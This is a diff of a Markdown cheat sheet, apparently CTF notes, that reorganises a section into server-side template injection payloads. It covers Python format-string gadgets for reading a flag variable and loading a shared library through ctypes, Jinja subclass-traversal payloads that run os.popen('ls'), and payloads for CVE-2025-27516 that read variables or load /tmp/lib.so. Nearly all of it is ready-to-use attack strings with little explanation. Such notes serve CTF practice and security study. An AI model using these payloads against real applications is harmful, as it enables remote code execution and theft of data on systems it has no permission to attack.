@@ -1,12 +1,42 @@
-# pyjail
+# SSTI
+
+## format string
+
+### Read var
+`{0.__init__.__globals__[__builtins__][quit].__init__.__globals__[sys].modules[flag].flag}`
+
+### Load libary to RCE
+
+[BuckeyeCTF 2024](https://corgi.rip/posts/buckeye-writeups/)
+
+```
+import pathlib
+import ctypes
+a = pathlib.Path.cwd()
+print("{a.unlink.__globals__[sys].modules[ctypes].cdll[/tmp/testload]}".format(a=a))
+```
+
+![](https://github.com/user-attachments/assets/b262a53b-b256-4951-a60b-6df7fbc12c0c)
+
+![](https://github.com/user-attachments/assets/88ced995-b409-4dc8-b890-f3d7052af33b)
+
+## jinja
 
 找 warnings
 
-`''.__class__.__mro__[1].__subclasses__()[182].__init__.__dir__()`
+`{{''.__class__.__mro__[1].__subclasses__()[182].__init__.__dir__()}}`
 
-`''.__class__.__mro__[1].__subclasses__()[182].__init__.__globals__["__builtins__"]["__import__"]('os').popen('ls').read()`
+`{{''.__class__.__mro__[1].__subclasses__()[182].__init__.__globals__["__builtins__"]["__import__"]('os').popen('ls').read()}}`
 
-[CVE-2025-27516](https://github.com/pallets/jinja/commit/90457bbf33b8662926ae65cdde4c4c32e756e403) `{{'{0.__init__.__globals__[__builtins__][quit].__init__.__globals__[sys].modules[flag].flag}'|attr('format')(xxx)}}`
+## [CVE-2025-27516](https://github.com/pallets/jinja/commit/90457bbf33b8662926ae65cdde4c4c32e756e403) 
+
+### Read var
+
+`{{'{0.__init__.__globals__[__builtins__][quit].__init__.__globals__[sys].modules[flag].flag}'|attr('format')(xxx)}}`
+
+### Load libary to RCE
+
+`{{'{0.__init__.__globals__[__builtins__][quit].__init__.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]}'|attr('format')(xxx)}}`
 
 ## django
 
